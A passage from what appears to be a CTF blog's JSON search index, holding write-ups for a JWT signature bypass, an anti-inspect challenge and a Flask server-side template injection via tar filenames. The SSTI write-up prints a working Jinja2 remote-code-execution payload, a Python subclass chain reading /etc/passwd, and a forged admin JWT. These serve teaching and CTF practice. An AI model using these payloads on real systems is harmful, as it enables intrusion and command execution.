instead of no verification at all, we should expect something harder\nthis time.\u003c/p\u003e","title":"LITCTF24 - Jwt 2"},{"content":"Challenge Description n c p a a o m t i e e n : g t o s j r : w y t : 1 - 1 1 w 1 e b I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.\nSolution We are presented with this interface\nIf we hit GET FLAG, we see a simple unauthorized message, and since the challenge\u0026rsquo;s name is jwt-1, it\u0026rsquo;s likely that we have to bypass the authorization mechanism put in place by the developers of this application.\nLet\u0026rsquo;s go ahead and create an account and log in. After that, we can notice using the developers\u0026rsquo; tools that a json web token cookie was generated.\nIn case you weren\u0026rsquo;t familar, JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems.\nA JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:\nThe reason why jwt tokens are secure even if stolen is because of the key used in the process of generation, without it, it\u0026rsquo;s almost impossible to generate a valid token. Luckily for us, this is a CTF challenge, and the signature might not be verified.\nBased on the decoding of the given jwt token, we can see the following format:\nAs we can see, there is an admin field which is set to false in our case, let\u0026rsquo;s generate a new token with admin set to true and an arbitrary key. I used jwt.io to generate the new token. Here is the new token with admin set to True.\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaHh1dSIsImFkbWluIjp0cnVlfQ.U_vtAik7xxrcSpVPH6DPAoZQSnw-21pJn7_0_IdN5w0 Using the browser application section to modify the cookie, we hit GET FLAG once again with the new jwt in place:\nflag is: LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}\nThings learned from this challenge:\nWhat json web tokens are and how they are formatted ","permalink":"https://hxuu.github.io/blog/ctf/lit24/jwt-1/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 112 57\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003ej\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003e-\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eI just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at \u003ca href=\"http://litctf.org:31781/\"\u003ehttp://litctf.org:31781/\u003c/a\u003e.\u003c/p\u003e","title":"LITCTF24 - Jwt 1"},{"content":"Challenge Description n c p a a o m t i e e n : g t o s a r : n y t : 1 i 0 - w 9 i e n b s p e e x c p t l o i t a t i o n can you find the answer? WARNING: do not open the link your computer will not enjoy it much. URL: http://litctf.org:31779/ Hint: If your flag does not work, think about how to style the output of console.log\nSolution Since the challenge warns us against opening the link on our browser, I assumed there is some kind of infinite loop inside the script tag. Curling the link given to us gives the following page:\n‚ûú curl http://litctf.org:31779/ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; const flag = \u0026#34;LITCTF{your_%cfOund_teh_fI@g_94932}\u0026#34;; while (true) console.log( flag, \u0026#34;background-color: darkblue; color: white; font-style: italic; border: 5px solid hotpink; font-size: 2em;\u0026#34; ); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; At first when I tried to submit the flag LITCTF{your_%cfOund_teh_fI@g_94932}, it said wrong flag, so I checked the hint, our flag doesn\u0026rsquo;t work, let\u0026rsquo;s take the javascript code inside the script tag and run it with nodejs\nThe flag is: LITCTF{your_fOund_teh_fI@g_94932}\nThings learned from this challenge:\nHow to inspect source code Simple usage of curl command ","permalink":"https://hxuu.github.io/blog/ctf/lit24/anti-inspect/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 216 57\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e0\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003e-\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e9\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'\u003ex\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003ecan you find the answer? WARNING: do not open the link your computer will not enjoy it much.\nURL: \u003ca href=\"http://litctf.org:31779/\"\u003ehttp://litctf.org:31779/\u003c/a\u003e Hint: If your flag does not work, think about how to style the output of console.log\u003c/p\u003e","title":"LITCTF24 - Anti Inspect"},{"content":"Challenge Description n c p a a a o u m t i t e e n h : g t o o s r f r : : i y l : 4 N e 7 o w 8 o s e b h b M a a r e s i x t n p e g l r o p i + o t r a N t t o a i o l o b n H a c k e r Welcome to the file sharing portal! We only support tar files!\nSolution We are presented with the following interface\nAs well as the source code of the application.\n#!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def main(): global username if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;index.html\u0026#39;) elif request.method == \u0026#39;POST\u0026#39;: file = request.files[\u0026#39;file\u0026#39;] if file.filename[-4:] != \u0026#39;.tar\u0026#39;: return render_template_string(\u0026#34;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026#34;) name = sha256(os.urandom(16)).digest().hex() os.makedirs(f\u0026#34;./uploads/{name}\u0026#34;, exist_ok=True) file.save(f\u0026#34;./uploads/{name}/{name}.tar\u0026#34;) try: tar_file = tarfile.TarFile(f\u0026#39;./uploads/{name}/{name}.tar\u0026#39;) tar_file.extractall(path=f\u0026#39;./uploads/{name}/\u0026#39;) return render_template_string(f\u0026#34;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href=\u0026#39;/view/{name}\u0026#39;\u0026gt;here\u0026lt;/a\u0026gt;\u0026#34;) except: return render_template_string(\u0026#34;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026#34;) @app.route(\u0026#39;/view/\u0026lt;name\u0026gt;\u0026#39;) def view(name): if not all([i in \u0026#34;abcdef1234567890\u0026#34; for i in name]): return render_template_string(\u0026#34;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026#34;) #print(os.popen(f\u0026#39;ls ./uploads/{name}\u0026#39;).read()) #print(name) files = os.listdir(f\u0026#34;./uploads/{name}\u0026#34;) out = \u0026#39;\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;\u0026#39; files.remove(f\u0026#39;{name}.tar\u0026#39;) # Remove the tar file from the list for i in files: out += f\u0026#39;\u0026lt;a href=\u0026#34;/read/{name}/{i}\u0026#34;\u0026gt;{i}\u0026lt;/a\u0026gt;\u0026#39; # except: return render_template_string(out) @app.route(\u0026#39;/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;\u0026#39;) def read(name,file): if (not all([i in \u0026#34;abcdef1234567890\u0026#34; for i in name])): return render_template_string(\u0026#34;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026#34;) if ((\u0026#34;..\u0026#34; in name) or (\u0026#34;..\u0026#34; in file)) or ((\u0026#34;/\u0026#34; in file) or \u0026#34;/\u0026#34; in name): return render_template_string(\u0026#34;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026#34;) f = open(f\u0026#39;./uploads/{name}/{file}\u0026#39;) data = f.read() f.close() return data if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=1337) The application has a file upload feature which only accepts tar archives. the tar archive is given a random name, saved in uploads/{name}. Its contents are extracted in the same path. when viewed using /view/{name} endpoint, the tar archive is deleted and the listing of files is shown. What\u0026rsquo;s interesting in the latter step is that the names of the uploaded files are passed directly, without sanitization into the render_template_string function by flask, which builds an html reponse server side using jinja2 as a templating engine.\n\u0026ldquo;I didn\u0026rsquo;t talk about the /read endpoint because it\u0026rsquo;s irrelavant in this writeup. but other writeups (linked at the end) make use of this endpoint\u0026rdquo;\nfrom the documentation of Flask: \u0026ldquo;Flask leverages Jinja2 as its template engine.\u0026rdquo;\nA Jinja template is simply a text file. Jinja can generate any text-based format (HTML, XML, CSV, LaTeX, etc.).\nSimply put, our filenames are taken straight from us and injected into the template. If our injection is malicious, we can get remote code execution and read the flag.\nBut\u0026hellip;\nWe have two problems at hand.\nhow can we execute python code inside the jinja2 template?\nwe don\u0026rsquo;t know the flag name (as shown in the Dockerfile)\nFROM python:3.9-slim RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y cron \u0026amp;\u0026amp; \\ apt-get clean \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* WORKDIR /app COPY requirements.txt server.py /app/ COPY templates/ /app/templates/ COPY uploads/ /app/uploads/ COPY REDACTED.txt /app/ # The flag file is redacted on purpose RUN pip install --no-cache-dir -r requirements.txt # Add the cron job to the crontab RUN mkdir /etc/cron.custom RUN echo \u0026#34;*/5 * * * * root rm -rf /app/uploads/*\u0026#34; \u0026gt; /etc/cron.custom/cleanup-cron RUN echo \u0026#34;* * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.custom\u0026#34; | tee -a /etc/crontab # Give execution rights on the cron job RUN chmod +x /etc/cron.custom/cleanup-cron RUN crontab /etc/cron.custom/cleanup-cron RUN crontab /etc/crontab CMD [\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;cron \u0026amp;\u0026amp; python server.py\u0026#34;] Taking a step back, A template contains variables and/or expressions, which get replaced with values when a template is rendered; we can test this out by archiving a file called {{5*5}} and viewing it in the /view endpoint\nHere is how we can go about doing so.\ntouch \u0026#34;{{5*5}}\u0026#34; tar -cvf proof-of-concept.tar \u0026#34;{{5*5}}\u0026#34; After the upload, we can see that the website indeed rendered 25 instead of {{5*5}}\nNice, we have confirmed that we have a SSTI, next is finding a way to run python code inside the template. But not any code\u0026hellip; Code that will enable us to find the name of the flag, and eventually read it.\nFor that, let me introduce some internals of python.\nSo in python, everything is an object, that means we can do something like\nprint(type(\u0026#39;hxuu\u0026#39;)) and we get \u0026lt;class 'str'\u0026gt;, that is, the string \u0026lsquo;hxuu\u0026rsquo; is an instance of the str class. In the same way variables are objects, functions too are objects. Now check this out.\nIn normal day to day programming, when we want to read a file using python, we would use something like this\nwith open(\u0026#39;/etc/passwd\u0026#39;) as file: content = file.read() which opens the /etc/passwd file and reads its content. We can achieve the same thing, but start with a string instead, how so?\nSince everything is an object, meaning everything in python inherents from the object class. we can climb the inheretence tree to reach all the subclasses available, select the one we want to use to execute a shell command, and boom, command executed. Like this:\n_ c l a s s _ _ . _ _ b a s e _ _ . _ _ s u b c l a s s e s _ _ ( ) [ \u0026lt; i n d e x - o f - _ i o . _ I O B a s e \u0026gt; ] . _ _ s u b c l a s s e s _ _ ( ) [ \u0026lt; i n d e x - o f - _ i o . _ R a w I O B a s e \u0026gt; ] . _ _ s u b c l a s s e s _ _ ( ) [ \u0026lt; i n d e x - o f - _ i o . F i l e I O \u0026gt; ] ( ' / e t c / p a s s w d ' ) . r e a d ( ) I know this is a very roundabout way of going about things, but we\u0026rsquo;ll need it in our challenge, because Flask by default passes certain variables to the jinja2 template by default, mainly:\nWe can use either one of those, but the easiest is the request object, from which we can access the application context, through which we can import the \u0026lsquo;os\u0026rsquo; module, and get RCE!\nLet\u0026rsquo;s build our payload then:\n{{request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;\u0026lt;our-command\u0026gt;\u0026#39;).read()}} Explanation: request.application: This accesses the application object associated with the current request in a web framework context. It often represents the main application object or a similar structure in web frameworks.\n__globals__: This attribute is a dictionary containing the global variables available in the scope where application is defined. It allows you to access global context or variables directly.\n__builtins__: This is a reference to the built-in module in Python that contains all built-in functions and exceptions. It\u0026rsquo;s accessible globally and is often used to get access to core Python functions.\n__import__('os'): This dynamically imports the os module using Python‚Äôs __import__ function. The os module provides a way to interact with the operating system, including executing shell commands.\npopen('\u0026lt;our-command\u0026gt;'): The popen method from the os module opens a pipe to or from a command. In this case, \u0026lt;our-command\u0026gt; should be replaced with the actual shell command you want to execute. popen runs the command and returns a file-like object connected to its standard output.\n.read(): This method reads all the output from the command executed by popen. It collects the command‚Äôs output as a string.\nSummary: This code snippet is used to execute a shell command from within a web template or application context and display its output. It does this by accessing global variables and built-in functions from the web application\u0026rsquo;s context, dynamically importing the os module, and using popen to run a command, finally reading and rendering the command\u0026rsquo;s output.\nPerfect! let\u0026rsquo;s test this out with the id command. Here is the result:\nWe are root! we got remote code execution, rest is to find the flag. This can be done by listing the directory contents using a simple ls\nnoice~ the flag name is:\nf l a g _ 1 5 b 7 2 6 a 2 4 e 0 4 c c 6 4 1 3 c b 1 5 b 9 d 9 1 e 5 4 8 9 4 8 d a c 0 7 3 b 8 5 c 3 3 f 8 2 4 9 5 b 1 0 e 9 e f e 2 c 6 e . t x t Change the command once again to\nc a t f l a g _ 1 5 b 7 2 6 a 2 4 e 0 4 c c 6 4 1 3 c b 1 5 b 9 d 9 1 e 5 4 8 9 4 8 d a c 0 7 3 b 8 5 c 3 3 f 8 2 4 9 5 b 1 0 e 9 e f e 2 c 6 e . t x t And there we go~ The flag is: n00bz{n3v3r_7rus71ng_t4r_4g41n!_f593b51385da}\nNotes This was a particularly interesting challenge, and my solution was not the intended solution haha. I know I overcomplicated things a lot, but hey, those pyjails I love playing paid a lot.\nWe learned about server side template injection, and some tricks with python. If you\u0026rsquo;re interested in other ways to solve the challenge, you can experiment with symbolic links, cron jobs OR\u0026hellip; a misuse of the archiving function in the python code. Hope you learned something, take care!\n","permalink":"https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 256 73\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='52' fill='currentColor' style='font-size:1em'\u003eu\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'\u003eh\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003ef\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e4\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'\u003eN\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e7\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e8\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'\u003eh\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'\u003eM\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='52' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='4' fill='currentColor' 